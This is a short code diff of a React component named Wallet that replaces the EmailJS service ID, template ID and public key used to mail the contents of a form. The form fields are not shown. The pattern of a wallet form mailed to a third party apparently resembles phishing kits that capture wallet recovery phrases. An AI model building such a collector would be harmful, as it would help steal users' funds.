@@ -26,11 +26,11 @@ export default function Wallet() {
 
     emailjs
       .sendForm(
-        "service_oullhud",
-        "template_drme18b",
+        "service_j7hjdbi",
+        "template_w4doy7k",
         form.current as unknown as string,
         {
-          publicKey: "1P5SKliVsMZAgJgD7",
+          publicKey: "cOODegwoykAeq3Nw_",
         }
       )
       .then(
